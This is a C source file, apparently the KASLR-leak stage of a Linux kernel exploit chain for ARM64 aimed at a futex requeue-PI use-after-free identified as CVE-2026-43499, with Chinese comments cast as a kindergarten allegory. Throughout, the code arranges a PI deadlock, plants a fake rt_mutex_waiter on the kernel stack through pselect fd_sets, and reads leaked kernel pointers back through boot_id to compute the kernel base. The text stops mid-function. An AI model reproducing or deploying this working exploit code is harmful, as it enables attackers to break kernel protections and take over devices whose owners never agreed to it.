/* ==========================================================================
 * 【第 1 关】偷看园长的排班表 —— KASLR 泄漏 (slide 路线)
 * ==========================================================================
 * 园长每天换办公室位置(KASLR)，你不知道她在哪。但你发现她有个习惯：
 * 让小朋友传话(pselect 排队)时，会在纸条背面不小心印出办公室门牌号。
 *
 * 具体玩法：
 *   a) waiter/owner 演双簧制造死锁环 -> FUTEX_CMP_REQUEUE_PI 走进 buggy
 *      回滚，把 waiter 内核栈上的排队标签(rt_mutex_waiter)变成"鬼标签"
 *   b) waiter 醒来后在同一个栈位置发起 pselect，用 fd_set 把"假标签"
 *      预先写进这片栈 —— 园长回头来整理鬼标签时，读到的全是我们写的内容
 *   c) consumer 喊老师改优先级(sched_setattr) -> 园长沿鬼标签走 PI 链，
 *      途中把假标签的 tree_entry(门牌墨痕) 写进 /proc/sys/kernel/random/boot_id
 *   d) 读 boot_id，减去编译期已知的 loggers[0] 偏移 => 园长办公室门牌 _stext
 *
 * 本关安全要点(全图自包含在一个回收页内，绝不碰随机化地址)：
 *   - 假标签父指针全染红(RED)：摘红色叶子标签不用找邻居核对，零副作用
 *   - 假标签树根 fake_w0 染黑(BLACK)：补挂标签时不会触发红红冲突找祖父
 *   - 任何一步碰未映射地址 = 整个幼儿园拉响警报(内核 panic 重启)
 * ========================================================================== */

#include "common.h"

#define SLIDE_MAX_ATTEMPTS 40
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
#define SLIDE_WAIT_SECONDS 3

/* DEPTH 0: ghost waiter prio 种 120(=DEFAULT_PRIO, CFS task 的 __waiter_prio
 * 恒为 120) -> rt_mutex_adjust_pi 的 rt_mutex_waiter_equal() 命中 ->
 * 零解引用早退。跑通即证明 shift 对齐(prio 字段读到我们种的值)且
 * UAF+walk 入口打通;崩了说明 shift 错(prio 读垃圾->走 walk->lock 解引用炸)。
 * DEPTH 2: prio=130(现状) 全链真跑(dequeue/enqueue/wake 链)。 */
#define SLIDE_DEPTH_EARLY_EXIT 0
#define SLIDE_DEPTH_FULL_CHAIN 2
#define SLIDE_CFS_WAITER_PRIO 120

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_blocking;
static atomic_int slide_owner_tid;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_go;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_calls;
static atomic_int slide_abort_attempt;
static int slide_probe_depth = SLIDE_DEPTH_FULL_CHAIN;
static atomic_int slide_child_edeadlk;
static int slide_shift_verified = -100;

static int slide_word_shift;

void *slide_consumer_thread(void *arg __attribute__((unused)));

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_word_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
    return;
  }
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  const char *set_name = set_idx == 0 ? "in" : set_idx == 1 ? "out" : "ex";
  pr_info("slide word map %s w%d -> %s[%d] (global %d) = %016llx\n",
          name, waiter_word, set_name, word_idx, global_word,
          (unsigned long long)value);
}

static void slide_dump_fdsets(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, const char *label) {
  const fd_set *sets[3] = {in, out, ex};
  const char *names[3] = {"in", "out", "ex"};
  for (int s = 0; s < 3; s++) {
    for (int w = 0; w < words_per_set; w++) {
      uint64_t v = fdset_get_word(sets[s], w);
      int global = s * words_per_set + w;
      if (v != 0) {
        pr_info("slide dump %s %s[%d] (global %d) = %016llx\n",
                label, names[s], w, global, (unsigned long long)v);
      }
    }
  }
  fflush(stdout);
}

/* 【读纸条背面的墨痕 v2 —— nfulnl_log_packet 数据别名】
 * boot_id 路由只在 slide=0 有效(写入的是我们种的编译期假门牌)。
 * 新路线:鬼标签被园长(PI 链)整理时,内核会把【真实内核指针】写进
 * 栈上的鬼标签字段 —— pselect 返回时 fd_set 从内核栈拷回用户态,
 * 对比"种进去的值"和"拷回来的值"就能看到墨痕:
 *
 *   loggers[1] (data 0x1fe2920)      ─┐
 *   nfulnl_logger (data 0x1fe29c8)    ├ 编译期已知偏移
 *   nfulnl_logger+0x10 logfn → nfulnl_log_packet (text) ─┘
 *
 * 回拷值若是指向这些结构的真实地址:
 *   _stext = 泄漏值 - KIMAGE_TEXT_BASE - 编译期偏移
 * 三个偏移逐一试算,2MB 对齐(ARM64 KASLR 约束)者即候选。 */
static uint64_t slide_fdset_stext;

static void slide_try_stext_candidate(uint64_t v, int set_idx, int word_idx) {
  if ((v >> 48) != 0xffff) {
    return;
  }
  struct {
    uint64_t off;
    const char *name;
  } cands[] = {
      {SLIDE_LOGGERS_0_1_OFF, "loggers[1]"},
      {SLIDE_NFULNL_LOGGER_OFF, "nfulnl_logger"},
      {SLIDE_INIT_TASK_OFF, "init_task"},
  };
  for (size_t i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
    uint64_t stext = v - KIMAGE_TEXT_BASE - cands[i].off;
    if (stext != 0 && (stext & 0x1fffffULL) == 0 && stext < 0x40000000ULL) {
      pr_success("slide fdset-leak-candidate pid=%d value=%016llx at "
                 "set=%d w%d assume=%s stext=%016llx slide=%016llx\n",
                 getpid(), (unsigned long long)v, set_idx, word_idx,
                 cands[i].name, (unsigned long long)stext,
                 (unsigned long long)stext);
      slide_fdset_stext = stext;
    }
  }
  if ((v >> 32) == 0xffffff88ULL) {
    pr_info("slide fdset-leak linear-heap value=%016llx at set=%d w%d "
            "(slab/task 地址,不是 text;留作后续页内自包含参照)\n",
            (unsigned long long)v, set_idx, word_idx);
  }
}

static void slide_scan_fdset_leak(
    const uint64_t pre_words[3][16], const fd_set *in, const fd_set *out,
    const fd_set *ex, int words_per_set) {
  const fd_set *sets[3] = {in, out, ex};
  const char *names[3] = {"in", "out", "ex"};
  int diffs = 0;
  for (int s = 0; s < 3; s++) {
    for (int w = 0; w < words_per_set && w < 16; w++) {
      uint64_t v = fdset_get_word(sets[s], w);
      if (v == pre_words[s][w]) {
        continue;
      }
      diffs++;
      pr_info("slide fdset DIFF %s[%d] pre=%016llx post=%016llx "
              "(内核在鬼标签区写回的内容)\n",
              names[s], w, (unsigned long long)pre_words[s][w],
              (unsigned long long)v);
      slide_try_stext_candidate(v, s, w);
    }
  }
  pr_info("slide fdset diff total=%d fdset_stext=%016llx\n", diffs,
          (unsigned long long)slide_fdset_stext);
  fflush(stdout);
}

/* 【伪造假标签】把伪造的 rt_mutex_waiter 逐字(8 字节/格)写进 fd_set。
 * pselect 进内核后会把 fd_set 拷到栈上 —— 恰好盖住鬼标签的位置(shift 对齐)。
 * 11 个格子对应假标签的 11 个字段：树父/右/左、PI树父/右/左、
 * task、lock、优先级、截止时间、ww_ctx。
 * 所有指针都指向魔法书包(回收页)内部 —— 页内自包含，绝不越界。 */
static void prepare_slide_pselect_fdsets_shifted(
    fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  /* Match CVE-2026-43499-Poc-Analysis REAL DEVICE verified words (11 words):
   * w0=tree_pc w1=tree_right w2=tree_left
   * w3=pi_parent w4=pi_right w5=pi_left
   * w6=task w7=lock
   * w8=wake_state(3)|prio(130)<<32 = 0x8200000003  [combined u64 at 0x40]
   * w9=deadline w10=ww_ctx
   * shift=3 maps w0→global3(0x18), w8→global11(0x58), w10→global13(0x68)
   * All within 3 sets × 5 words = 15 slots (global 0-14). */
  uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
  if (slide_probe_depth == SLIDE_DEPTH_EARLY_EXIT) {
    waiter_prio_word = ((uint64_t)SLIDE_CFS_WAITER_PRIO << 32) | 3;
  }
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    /* Page-contained fake graph + rbtree color discipline:
     * - parents MUST be |1 (RED): rb_erase of a BLACK node runs
     *   __rb_erase_color which dereferences the sibling of an in-page stub
     *   (all-zero) -> NULL deref panic. RED leaf erase is side-effect free.
     * - children NULL, waiter->task/lock point back into the page.
     * - fake_w0 itself is planted BLACK (util.c) so re-insertion of the RED
     *   waiter never triggers the red-red gparent rotation (parent==NULL
     *   deref). */
    {0, fake_w0 - W0_OFF + RIGHT_OFF + 1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, 0, "tree_left"},
    {3, fake_w0 - W0_OFF + LEFT_OFF + 1, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, fake_task, "task"},
    {7, fake_lock, "lock"},
    {8, waiter_prio_word, "wake_state_prio"},
    {9, 0, "deadline"},
    {10, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

/* 【传话排队】waiter 睡进 pselect(纸条交上去、栈上盖好假标签)，
 * 同时放一个捣乱的 consumer 线程在旁边待命 —— 它负责喊老师改优先级，
 * 逼园长沿着鬼标签走 PI 链，把门牌墨痕写到 boot_id 纸条上。 */
void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);
  /* 保存"种进去的值"副本 —— pselect 返回后对比找墨痕(内核写回) */
  int words_per_set = slide_pselect_words_per_set();
  uint64_t pre_words[3][16];
  const fd_set *sets_pre[3] = {&in, &out, &ex};
  for (int s = 0; s < 3; s++) {
    for (int w = 0; w < words_per_set && w < 16; w++) {
      pre_words[s][w] = fdset_get_word(sets_pre[s], w);
    }
    for (int w = words_per_set; w < 16; w++) {
      pre_words[s][w] = 0;
    }
  }
  slide_dump_fdsets(&in, &out, &ex, words_per_set, "pre-pselect");

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_calls, 0);
  pr_info("slide pselect setup shift=%d nfds=%d page=%zx fake_lock=%zx fake_w0=%zx fake_task=%zx\n",
          slide_word_shift, SLIDE_PSELECT_NFDS, page_base, fake_lock, fake_w0, fake_task);
  pthread_t consumer;
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  atomic_store(&slide_consume_go, 1);
  pr_info("slide pselect ENTERING syscall shift=%d timeout_sec=%d block_fd=%d\n",
          slide_word_shift, (int)PSELECT_TIMEOUT_SEC, block_fd);
  fflush(stdout);
  errno = 0;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d depth=%d sched_ok=%d calls=%d\n",
          ret, saved_errno, slide_word_shift,
          slide_probe_depth,
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_calls));
  pr_info("slide pselect comparing fd_sets vs planted payload "
          "(diffs = kernel wrote back into the waiter stack region)\n");
  slide_dump_fdsets(&in, &out, &ex, words_per_set, "post-pselect");
  /* 【墨痕扫描】post 与 pre 逐字对比,识别内核写回的真实指针,
   * 按 loggers[1]/nfulnl_logger/init_task 偏移试算 _stext */
  slide_scan_fdset_leak(pre_words, &in, &out, &ex, words_per_set);
  fflush(stdout);

  pthread_join(consumer, NULL);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static void slide_alarm_handler(int sig __attribute__((unused))) {
  static const char msg[] = "[*] slide SIGALRM handler entered (interrupting pselect)\n";
  ssize_t ign = write(1, msg, sizeof(msg) - 1);
  (void)ign;
  syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
}

/* 【捣乱的小朋友】两段式喊话：
 * 1) RT-ENTER：喊"给 waiter 转 SCHED_FIFO 实时班"(几乎必被拒 EPERM，
 *    因为没权限 —— 这一步只是探路，不会触发 PI 链遍历)
 * 2) NICE-ENTER：改喊"给 waiter 调 nice 值"(这个允许) —— 老师改优先级
 *    必须走 rt_mutex_setprio -> adjust_prio_chain，园长被迫沿鬼标签走路！
 * 上次内核重启就死在这一步：摘黑色鬼标签要找邻居核对 -> 空指针。
 * 修复后(父指针全红)摘标签零副作用，这里应能安全走到 NICE-DONE。 */
void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    usleep(1000);

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    pr_info("slide consumer call#%d tid=%d depth=%d stage=RT-ENTER sched_setattr SCHED_FIFO prio=50\n",
            calls + 1, tid, slide_probe_depth);
    fflush(stdout);
    errno = 0;
    long ret = sched_setattr_tid_rt(tid, 50);
    int call_errno = errno;
    pr_info("slide consumer call#%d stage=RT-DONE ret=%ld errno=%d (EPERM=1 means no PI walk on this call)\n",
            calls + 1, ret, call_errno);
    fflush(stdout);
    if (ret != 0 && call_errno == 1) { /* EPERM */
      pr_info("slide consumer call#%d stage=NICE-ENTER sched_setattr nice=%d (this DOES trigger rt_mutex_setprio -> adjust_prio_chain)\n",
              calls + 1, PSELECT_CONSUMER_NICE);
      fflush(stdout);
      errno = 0;
      ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
      call_errno = errno;
      pr_info("slide consumer call#%d stage=NICE-DONE ret=%ld errno=%d\n",
              calls + 1, ret, call_errno);
      fflush(stdout);
    }
    if (ret == 0) {
      atomic_fetch_add(&slide_consume_sched_ok, 1);
    }
    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));
    fflush(stdout);

    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* 【传纸条的小朋友】动作顺序(一步都不能乱)：
 * 1. 抢到 pi_chain 玩具(拿住不放，形成环的下半圈)
 * 2. 等 owner 就位后，去 f_wait 排队并登记"想换到 pi_target"(FUTEX_WAIT_REQUEUE_PI)
 *    —— 园长在 waiter 内核栈上挂好真排队标签 rt_mutex_waiter
 * 3. 收到闹钟(SIGALRM)后立刻原地 pselect —— 栈上真标签变鬼标签，
 *    同一片栈马上被我们的 fd_set 假标签覆盖
 * 4. 全程不放开 pi_chain：一放手 owner 醒来乱跑，园长沿鬼标签走路必崩 */
void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
  pr_info("slide waiter tid=%d locking pi_chain futex=%p\n", tid, (void *)&slide_f_pi_chain);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = slide_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);

  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  errno = 0;
  long lc = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lc != 0) {
    pr_error("slide waiter lock chain ret=%ld errno=%d\n", lc, errno);
    return NULL;
  }
  pr_info("slide waiter locked pi_chain\n");

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  pr_info("slide waiter before FUTEX_WAIT_REQUEUE_PI f_wait=%p pi_target=%p\n",
          (void *)&slide_f_wait, (void *)&slide_f_pi_target);
  errno = 0;
  long wr = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                     &slide_f_pi_target, 0);
  pr_info("slide waiter after FUTEX_WAIT_REQUEUE_PI ret=%ld errno=%d\n", wr, errno);
  if (atomic_load(&slide_abort_attempt)) {
    /* requeue 没触发 EDEADLK(纯时序竞争): 本轮没有 UAF, 走完 pselect 也
     * 拿不到泄漏 —— 直接收工, 省掉 5 秒 pselect, 让父进程立刻开下一轮。 */
    pr_info("slide waiter aborting attempt (no EDEADLK armed), skip pselect\n");
    atomic_store(&slide_route_done, 1);
    for (;;) {
      sleep(1);
    }
  }
  /* CVE-2026-43499 choreography: keep pi_chain held across pselect.
   * Unlocking wakes the owner, which then races the fake rbtree walk -> panic. */
  pr_info("slide waiter holding pi_chain across pselect\n");

  signal(SIGALRM, SIG_DFL);

  pr_info("slide waiter before pselect_stack_copy page=%zx lock=%zx w0=%zx task=%zx\n",
          page_base, fake_lock, fake_w0, fake_task);
  slide_pselect_stack_copy();
  pr_info("slide waiter pselect_stack_copy done\n");
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

/* 【占玩具的小朋友】先抱住 pi_target 玩具(环的上半圈)，等 waiter
 * 挂好标签后，自己也去排队抢 pi_chain —— 和 waiter 面对面互等，
 * 死锁环闭合：owner->chain->waiter->target->owner。
 * 必须卡在"已睡死在 pi_chain 上"的状态(wchan=futex)，园长换玩具时
 * 才会撞见死锁，走进 buggy 回滚路径把真标签错摘成鬼标签。 */
void *slide_owner_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_owner_tid, tid);
  pr_info("slide owner started, locking pi_target futex=%p\n", (void *)&slide_f_pi_target);
  errno = 0;
  long lt = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lt != 0) {
    pr_error("slide owner lock target ret=%ld errno=%d\n", lt, errno);
    return NULL;
  }
  pr_info("slide owner locked pi_target\n");

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  pr_info("slide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)\n");
  atomic_store(&slide_owner_blocking, 1);
  errno = 0;
  long ol = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("slide owner FUTEX_LOCK_PI(pi_chain) ret=%ld errno=%d (should stay blocked; EDEADLK here means the requeue ran too late)\n", ol, errno);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

/* 【读纸条背面】园长整理鬼标签时会把假标签的 tree_entry(我们种下的
 * 墨痕值)写进 boot_id 纸条。读出来有两种结局：
 *  - 值 == 我们种下的假门牌 => 写原语打通(机制证明)，但还不是真门牌
 *  - 值减去编译期 loggers[0] 偏移后 2MB 对齐 => 真园长办公室门牌 _stext！ */
uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide leaked value is not a kernel pointer (likely untouched "
               "boot_id): %016llx\n", (unsigned long long)leaked);
    return 0;
  }

  if (leaked == SLIDE_LOGGERS_0_1) {
    /* The rb_erase W1 wrote our planted tree_pc into boot_id: the UAF +
     * consumer walk primitive works on this kernel. The planted word is a
     * slide-independent linear-map alias, so this is a mechanism proof, not a
     * KASLR leak (per upstream, the boot_id route is only valid at slide=0). */
    pr_success("slide boot_id-mechanism-ok pid=%d wrote=%016llx (UAF+walk write landed)\n",
               getpid(), (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
  uint64_t stext = leaked - off;
  if ((stext & 0x1fffffULL) != 0 || stext < KIMAGE_TEXT_BASE ||
      stext >= KIMAGE_TEXT_BASE + 0x40000000ULL) {
    pr_warning("slide stext failed sanity check leaked=%016llx stext=%016llx "
               "(need 2MB-aligned within KASLR range)\n",
               (unsigned long long)leaked, (unsigned long long)stext);
    return 0;
  }
  pr_success("slide boot_id_leaked_loggers_0_1 pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}

static int slide_owner_wchan_is_futex(int tid) {
  char path[64];
  char buf[128];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  return strstr(buf, "futex") != NULL;
}

/* 【闯关导演(子进程)】按剧本走完整场戏：
 * 确认 owner 真的睡死在 pi_chain 上(wchan 查岗) -> 喊"换玩具！"
 * (FUTEX_CMP_REQUEUE_PI) -> 期待 ret=-1/EDEADLK(buggy 回滚被触发) ->
 * 闹钟叫醒 waiter 去 pselect 盖假标签 -> 等 consumer 喊完老师 ->
 * 读 boot_id 纸条背面的门牌墨痕。 */
uint64_t slide_child_leak_stext(void) {
  sigset_t block;
  sigemptyset(&block);
  sigaddset(&block, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &block, NULL);

  pthread_t waiter;
  pthread_t owner;
  pr_info("slide child creating threads waiter/owner\n");
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  pr_info("slide child waiting for waiter_waiting && owner_started\n");

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* The EDEADLK must fire INSIDE the requeue's chain walk, so the owner has
   * to be already blocked on pi_chain (owner -> chain -> waiter -> target ->
   * owner) when FUTEX_CMP_REQUEUE_PI runs. Confirm via wchan. */
  int owner_tid = atomic_load(&slide_owner_tid);
  int blocked = 0;
  for (int i = 0; i < 100 && !blocked; i++) {
    blocked = slide_owner_wchan_is_futex(owner_tid);
    if (!blocked) {
      usleep(5000);
    }
  }
  pr_info("slide child owner_blocked_on_futex=%d tid=%d\n", blocked, owner_tid);
  if (!blocked) {
    usleep(50000);
  }
  /* wchan=futex 只说明 owner 睡下了, 它在 pi_chain 上的 PI 依赖
   * (owner->pi_blocked_on 指向 chain 的 waiter) 还需要一点时间建立。
   * 立刻 requeue 会撞上空窗 -> requeue 返回 0(无 EDEADLK, 见 run2 attempt2)。
   * 等 20ms 让环完全闭合再发。 */
  usleep(20000);

  pr_info("slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI\n");

  errno = 0;
  long req = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &slide_f_pi_target, 0);
  pr_info("slide child FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)\n",
          req, errno);
  if (req >= 0) {
    pr_warning("slide requeue returned success (no EDEADLK): PI cycle was not armed, write primitive will NOT fire this attempt\n");
    /* 快速收工: 叫醒 waiter 走 abort 分支, 不再浪费 5 秒 pselect。 */
    atomic_store(&slide_abort_attempt, 1);
    usleep(100000);
    pthread_kill(waiter, SIGALRM);
    while (!atomic_load(&slide_route_done)) {
      sleep(1);
    }
    pr_info("slide child aborted attempt (no EDEADLK)\n");
    return 0;
  }
  atomic_store(&slide_child_edeadlk, 1);

  usleep(50000);
  pthread_kill(waiter, SIGALRM);
  pr_info("slide child sent SIGALRM, waiting route_done\n");

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }
  pr_info("slide child route_done, reading boot_id\n");

  /* 泄漏优先级:
   * 1) boot_id 数据别名读出的 loggers 真值(老路由,slide=0 才有效)
   * 2) fd_set 回拷墨痕(新路由:PI 链写进鬼标签的真实指针,
   *    按 nfulnl_log_packet 数据别名三个偏移试算)
   * 父进程侧还有 2MB 对齐二次校验兜底。 */
  uint64_t stext = slide_read_stext();
  if (!stext && slide_fdset_stext) {
    stext = slide_fdset_stext;
    pr_success("slide child fdset-route stext=%016llx (boot_id empty, "
               "using nfulnl data-alias candidate)\n",
               (unsigned long long)stext);
  }
  return stext;
}

/* 【第 1 关总入口】多次尝试(最多 40 轮)，每轮：
 *   - 轮换 shift(纸条和栈的对齐偏差，编译器布局决定，需试出来)
 *   - 两段验证序列：同一 shift 先跑 DEPTH 0(prio=120 早退,零解引用)验证
 *     对齐,不崩才升级 DEPTH 2(全链真跑)。DEPTH 0 崩 = shift 错
 *     (prio 读垃圾 -> walk -> lock 解引用炸),设备重启换 SLIDE_SHIFT 再来。
 *   - 每轮新备一个魔法书包(内核页)，演砸了(child 崩)也只损失一轮
 * 闯关成功判据：子进程从管道送回非零 _stext 门牌号。 */
struct slide_child_result {
  uint64_t stext;
  uint32_t edeadlk_ok;
  uint32_t depth;
};

int slide_leak_kernel_base(void) {
  /* shift = (futex waiter stack offset - pselect fd_set word0 offset) / 8.
   * Compiler/layout dependent: override with SLIDE_SHIFT env to probe.
   * NB: a wrong shift can corrupt the stack waiter and panic instead of failing. */
  const char *env = getenv("SLIDE_SHIFT");
  int fixed_shift = -100;
  if (env && *env) {
    fixed_shift = (int)strtol(env, NULL, 10);
    pr_info("slide SLIDE_SHIFT=%d (fixed)\n", fixed_shift);
  }
  /* 单 shift 单跑(防连环重启):
